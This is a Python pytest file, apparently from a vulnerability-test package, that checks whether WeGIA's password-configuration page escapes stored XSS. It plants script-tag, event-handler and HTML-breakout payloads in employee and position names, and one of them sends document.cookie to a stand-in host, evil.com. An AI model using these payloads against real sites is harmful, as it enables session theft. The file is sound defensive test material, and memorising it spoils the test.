"""
Vulnerability tests for WeGIA password configuration page.
These tests verify the XSS vulnerability status:
- FAIL in vulnerable state (XSS payload is not escaped, vulnerability exploitable)
- PASS in fixed state (XSS payload is properly escaped)
"""
import os
import pytest
import requests
import pymysql
import re
import html

# Configuration
BASE_URL = os.environ.get("APP_URL", "http://localhost:8080")
DB_HOST = os.environ.get("DB_HOST", "localhost")
DB_USER = os.environ.get("DB_USER", "wegiauser")
DB_PASSWORD = os.environ.get("DB_PASSWORD", "senha")
DB_NAME = os.environ.get("DB_NAME", "wegia")

TARGET_PAGE = f"{BASE_URL}/WeGIA/html/geral/configurar_senhas.php"


def get_db_connection():
    """Create a database connection."""
    return pymysql.connect(
        host=DB_HOST,
        user=DB_USER,
        password=DB_PASSWORD,
        database=DB_NAME,
        charset='utf8mb4',
        cursorclass=pymysql.cursors.DictCursor
    )


def get_authenticated_session():
    """Create an authenticated session for accessing protected pages."""
    session = requests.Session()

    # Attempt login - WeGIA uses html/login.php with cpf and pwd fields
    login_url = f"{BASE_URL}/WeGIA/html/login.php"
    login_data = {
        "cpf": "admin",
        "pwd": "wegia"
    }

    try:
        response = session.post(login_url, data=login_data, allow_redirects=True, timeout=10)
    except requests.exceptions.RequestException:
        pass

    return session


def insert_test_employee(cursor, name, cpf_suffix, cargo_id=98):
    """Helper to insert a test employee with a given name."""
    # Ensure cargo exists
    cursor.execute(f"INSERT IGNORE INTO cargo (id_cargo, cargo) VALUES ({cargo_id}, 'Test Position')")

    # Ensure situacao exists
    cursor.execute("INSERT IGNORE INTO situacao (id_situacao, situacoes) VALUES (1, 'Ativo')")

    # Insert person
    cursor.execute(
        "INSERT INTO pessoa (nome, cpf, senha) VALUES (%s, %s, 'hash123')",
        (name, f'xss_test_{cpf_suffix}')
    )
    pessoa_id = cursor.lastrowid

    # Insert funcionario record
    cursor.execute(
        "INSERT INTO funcionario (id_pessoa, id_cargo, id_situacao, data_admissao, ctps) "
        f"VALUES (%s, {cargo_id}, 1, CURDATE(), '99999')",
        (pessoa_id,)
    )

    return pessoa_id


def cleanup_test_employee(cursor, pessoa_id):
    """Helper to cleanup test employee."""
    cursor.execute("DELETE FROM funcionario WHERE id_pessoa = %s", (pessoa_id,))
    cursor.execute("DELETE FROM pessoa WHERE id_pessoa = %s", (pessoa_id,))


def is_payload_escaped(response_text, raw_payload, escaped_payload=None):
    """
    Check if a payload is properly escaped in the response.
    Returns True if escaped (safe), False if raw payload is present (vulnerable).
    """
    # If escaped version is provided, check for it
    if escaped_payload and escaped_payload in response_text:
        return True

    # Check if raw payload appears unescaped in the HTML
    if raw_payload in response_text:
        return False

    return True


class TestStoredXSSScriptTag:
    """Test stored XSS via script tag payloads."""

    def test_basic_script_tag_xss(self):
        """
        Test basic <script> tag injection in employee name.
        VULNERABLE: <script>alert('XSS')</script> appears raw in HTML
        FIXED: Escaped as &lt;script&gt;alert('XSS')&lt;/script&gt;
        """
        payload = "<script>alert('XSS')</script>"
        escaped = "&lt;script&gt;alert('XSS')&lt;/script&gt;"

        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            pessoa_id = insert_test_employee(cursor, payload, "script_basic")
            conn.commit()

            session = get_authenticated_session()
            response = session.get(TARGET_PAGE, timeout=10)

            # Cleanup first
            cleanup_test_employee(cursor, pessoa_id)
            conn.commit()
            conn.close()

            if response.status_code != 200:
                pytest.skip(f"Page returned status {response.status_code}")

            # Vulnerability check: raw script tag should NOT appear
            assert payload not in response.text, \
                f"XSS vulnerability detected: raw script tag found in response"

        except pymysql.Error as e:
            pytest.skip(f"Database error: {e}")
        except requests.exceptions.RequestException as e:
            pytest.skip(f"Connection error: {e}")

    def test_script_tag_with_document_access(self):
        """
        Test script tag that attempts to access document object.
        This payload would steal cookies in a real attack.
        """
        payload = "<script>document.location='http://evil.com/steal?c='+document.cookie</script>"

        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            pessoa_id = insert_test_employee(cursor, payload, "script_cookie")
            conn.commit()

            session = get_authenticated_session()
            response = session.get(TARGET_PAGE, timeout=10)

            cleanup_test_employee(cursor, pessoa_id)
            conn.commit()
            conn.close()

            if response.status_code != 200:
                pytest.skip(f"Page returned status {response.status_code}")

            # The raw script should not appear
            assert "<script>document.location" not in response.text, \
                "XSS vulnerability: script with document access found unescaped"

        except pymysql.Error as e:
            pytest.skip(f"Database error: {e}")
        except requests.exceptions.RequestException as e:
            pytest.skip(f"Connection error: {e}")

    def test_script_tag_uppercase(self):
        """Test uppercase <SCRIPT> tag variation."""
        payload = "<SCRIPT>alert('XSS')</SCRIPT>"

        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            pessoa_id = insert_test_employee(cursor, payload, "script_upper")
            conn.commit()

            session = get_authenticated_session()
            response = session.get(TARGET_PAGE, timeout=10)

            cleanup_test_employee(cursor, pessoa_id)
            conn.commit()
            conn.close()

            if response.status_code != 200:
                pytest.skip(f"Page returned status {response.status_code}")

            # Check both upper and lowercase versions
            assert payload not in response.text and \
                   payload.lower() not in response.text.lower() or \
                   "&lt;SCRIPT&gt;" in response.text or \
                   "&lt;script&gt;" in response.text.lower(), \
                "XSS vulnerability: SCRIPT tag found unescaped"

        except pymysql.Error as e:
            pytest.skip(f"Database error: {e}")
        except requests.exceptions.RequestException as e:
            pytest.skip(f"Connection error: {e}")


class TestStoredXSSEventHandlers:
    """Test stored XSS via event handler payloads."""

    def test_img_onerror_xss(self):
        """
        Test <img src=x onerror=...> injection.
        This is a common XSS bypass technique.
        """
        payload = "<img src=x onerror=alert('XSS')>"

        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            pessoa_id = insert_test_employee(cursor, payload, "img_onerror")
            conn.commit()

            session = get_authenticated_session()
            response = session.get(TARGET_PAGE, timeout=10)

            cleanup_test_employee(cursor, pessoa_id)
            conn.commit()
            conn.close()

            if response.status_code != 200:
                pytest.skip(f"Page returned status {response.status_code}")

            # The raw img tag with onerror should not appear
            assert "<img src=x onerror" not in response.text, \
                "XSS vulnerability: img onerror event handler found unescaped"

        except pymysql.Error as e:
            pytest.skip(f"Database error: {e}")
        except requests.exceptions.RequestException as e:
            pytest.skip(f"Connection error: {e}")

    def test_svg_onload_xss(self):
        """
        Test <svg onload=...> injection.
        SVG tags are another common XSS vector.
        """
        payload = "<svg onload=alert('XSS')>"

        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            pessoa_id = insert_test_employee(cursor, payload, "svg_onload")
            conn.commit()

            session = get_authenticated_session()
            response = session.get(TARGET_PAGE, timeout=10)

            cleanup_test_employee(cursor, pessoa_id)
            conn.commit()
            conn.close()

            if response.status_code != 200:
                pytest.skip(f"Page returned status {response.status_code}")

            assert "<svg onload" not in response.text, \
                "XSS vulnerability: svg onload event handler found unescaped"

        except pymysql.Error as e:
            pytest.skip(f"Database error: {e}")
        except requests.exceptions.RequestException as e:
            pytest.skip(f"Connection error: {e}")

    def test_body_onload_xss(self):
        """
        Test </option><body onload=...> to break out of option context.
        """
        payload = "</option><body onload=alert('XSS')>"

        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            pessoa_id = insert_test_employee(cursor, payload, "body_onload")
            conn.commit()

            session = get_authenticated_session()
            response = session.get(TARGET_PAGE, timeout=10)

            cleanup_test_employee(cursor, pessoa_id)
            conn.commit()
            conn.close()

            if response.status_code != 200:
                pytest.skip(f"Page returned status {response.status_code}")

            assert "</option><body onload" not in response.text, \
                "XSS vulnerability: body onload injection found unescaped"

        except pymysql.Error as e:
            pytest.skip(f"Database error: {e}")
        except requests.exceptions.RequestException as e:
            pytest.skip(f"Connection error: {e}")


class TestStoredXSSHTMLContextBreakout:
    """Test stored XSS via HTML context breakout."""

    def test_option_breakout_xss(self):
        """
        Test breaking out of <option> tag context.
        Payload: "><script>alert('XSS')</script><option value="
        """
        payload = '"><script>alert(1)</script><option value="'

        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            pessoa_id = insert_test_employee(cursor, payload, "option_break")
            conn.commit()

            session = get_authenticated_session()
            response = session.get(TARGET_PAGE, timeout=10)

            cleanup_test_employee(cursor, pessoa_id)
            conn.commit()
            conn.close()

            if response.status_code != 200:
                pytest.skip(f"Page returned status {response.status_code}")

            # Check that the breakout pattern is not present
            assert '"><script>' not in response.text, \
                "XSS vulnerability: option context breakout found"

        except pymysql.Error as e:
            pytest.skip(f"Database error: {e}")
        except requests.exceptions.RequestException as e:
            pytest.skip(f"Connection error: {e}")

    def test_close_select_inject_script(self):
        """
        Test closing </select> and injecting script.
        """
        payload = "</select><script>alert('XSS')</script><select>"

        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            pessoa_id = insert_test_employee(cursor, payload, "select_close")
            conn.commit()

            session = get_authenticated_session()
            response = session.get(TARGET_PAGE, timeout=10)

            cleanup_test_employee(cursor, pessoa_id)
            conn.commit()
            conn.close()

            if response.status_code != 200:
                pytest.skip(f"Page returned status {response.status_code}")

            assert "</select><script>" not in response.text, \
                "XSS vulnerability: select breakout with script injection found"

        except pymysql.Error as e:
            pytest.skip(f"Database error: {e}")
        except requests.exceptions.RequestException as e:
            pytest.skip(f"Connection error: {e}")

    def test_attribute_injection(self):
        """
        Test injecting attributes via quote breakout.
        Payload attempts to add onclick handler.
        """
        payload = '" onclick="alert(\'XSS\')" data-x="'

        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            pessoa_id = insert_test_employee(cursor, payload, "attr_inject")
            conn.commit()

            session = get_authenticated_session()
            response = session.get(TARGET_PAGE, timeout=10)

            cleanup_test_employee(cursor, pessoa_id)
            conn.commit()
            conn.close()

            if response.status_code != 200:
                pytest.skip(f"Page returned status {response.status_code}")

            # The onclick handler should not appear as an actual attribute
            assert 'onclick="alert' not in response.text, \
                "XSS vulnerability: attribute injection with onclick found"

        except pymysql.Error as e:
            pytest.skip(f"Database error: {e}")
        except requests.exceptions.RequestException as e:
            pytest.skip(f"Connection error: {e}")


class TestStoredXSSEncodedPayloads:
    """Test stored XSS with various encoding techniques."""

    def test_html_entities_in_name(self):
        """
        Test that HTML entities in names are handled correctly.
        Names like "Smith & Jones" should display properly.
        """
        payload = "Smith & Jones <Legal>"

        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            pessoa_id = insert_test_employee(cursor, payload, "entities")
            conn.commit()

            session = get_authenticated_session()
            response = session.get(TARGET_PAGE, timeout=10)

            cleanup_test_employee(cursor, pessoa_id)
            conn.commit()
            conn.close()

            if response.status_code != 200:
                pytest.skip(f"Page returned status {response.status_code}")

            # The < and > should be encoded
            # Either the raw payload should not be there, or it should be escaped
            if payload in response.text:
                # Raw payload found - vulnerable
                assert False, \
                    "XSS vulnerability: HTML special characters not escaped"

        except pymysql.Error as e:
            pytest.skip(f"Database error: {e}")
        except requests.exceptions.RequestException as e:
            pytest.skip(f"Connection error: {e}")

    def test_mixed_case_and_spaces(self):
        """
        Test XSS with mixed case and extra spaces to bypass filters.
        """
        payload = "<sCriPt >alert('XSS')</sCriPt >"

        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            pessoa_id = insert_test_employee(cursor, payload, "mixedcase")
            conn.commit()

            session = get_authenticated_session()
            response = session.get(TARGET_PAGE, timeout=10)

            cleanup_test_employee(cursor, pessoa_id)
            conn.commit()
            conn.close()

            if response.status_code != 200:
                pytest.skip(f"Page returned status {response.status_code}")

            # Check that the script tag is not present in any form
            assert "<script" not in response.text.lower() or \
                   "&lt;script" in response.text.lower(), \
                "XSS vulnerability: mixed case script tag found unescaped"

        except pymysql.Error as e:
            pytest.skip(f"Database error: {e}")
        except requests.exceptions.RequestException as e:
            pytest.skip(f"Connection error: {e}")


class TestStoredXSSInCargoField:
    """Test stored XSS via the cargo (position) field."""

    def test_xss_in_cargo_name(self):
        """
        Test XSS payload in the cargo/position field.
        The position name is also rendered in the dropdown.
        """
        cargo_payload = "<script>alert('cargo')</script>"
        cargo_id = 97

        try:
            conn = get_db_connection()
            cursor = conn.cursor()

            # Create cargo with XSS payload
            cursor.execute(
                "INSERT INTO cargo (id_cargo, cargo) VALUES (%s, %s) "
                "ON DUPLICATE KEY UPDATE cargo = %s",
                (cargo_id, cargo_payload, cargo_payload)
            )

            # Insert situacao
            cursor.execute("INSERT IGNORE INTO situacao (id_situacao, situacoes) VALUES (1, 'Ativo')")

            # Insert person
            cursor.execute(
                "INSERT INTO pessoa (nome, cpf, senha) VALUES ('Normal Name', 'cargo_test', 'hash')"
            )
            pessoa_id = cursor.lastrowid

            # Link to malicious cargo
            cursor.execute(
                "INSERT INTO funcionario (id_pessoa, id_cargo, id_situacao, data_admissao, ctps) "
                "VALUES (%s, %s, 1, CURDATE(), '88888')",
                (pessoa_id, cargo_id)
            )
            conn.commit()

            session = get_authenticated_session()
            response = session.get(TARGET_PAGE, timeout=10)

            # Cleanup
            cleanup_test_employee(cursor, pessoa_id)
            cursor.execute("DELETE FROM cargo WHERE id_cargo = %s", (cargo_id,))
            conn.commit()
            conn.close()

            if response.status_code != 200:
                pytest.skip(f"Page returned status {response.status_code}")

            assert cargo_payload not in response.text, \
                "XSS vulnerability: script in cargo field found unescaped"

        except pymysql.Error as e:
            pytest.skip(f"Database error: {e}")
        except requests.exceptions.RequestException as e:
            pytest.skip(f"Connection error: {e}")


class TestMultiplePayloadsInSamePage:
    """Test behavior when multiple XSS payloads are present."""

    def test_multiple_malicious_employees(self):
        """
        Test that multiple employees with different XSS payloads are all escaped.
        """
        payloads = [
            ("<script>alert(1)</script>", "multi_1"),
            ("<img src=x onerror=alert(2)>", "multi_2"),
            ("</option><svg onload=alert(3)>", "multi_3"),
        ]

        pessoa_ids = []

        try:
            conn = get_db_connection()
            cursor = conn.cursor()

            for payload, suffix in payloads:
                pessoa_id = insert_test_employee(cursor, payload, suffix, cargo_id=96)
                pessoa_ids.append(pessoa_id)

            conn.commit()

            session = get_authenticated_session()
            response = session.get(TARGET_PAGE, timeout=10)

            # Cleanup
            for pessoa_id in pessoa_ids:
                cleanup_test_employee(cursor, pessoa_id)
            conn.commit()
            conn.close()

            if response.status_code != 200:
                pytest.skip(f"Page returned status {response.status_code}")

            # Check that no raw payload appears
            vulnerabilities = []
            for payload, _ in payloads:
                if payload in response.text:
                    vulnerabilities.append(payload)

            assert len(vulnerabilities) == 0, \
                f"XSS vulnerabilities found: {vulnerabilities}"

        except pymysql.Error as e:
            pytest.skip(f"Database error: {e}")
        except requests.exceptions.RequestException as e:
            pytest.skip(f"Connection error: {e}")


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
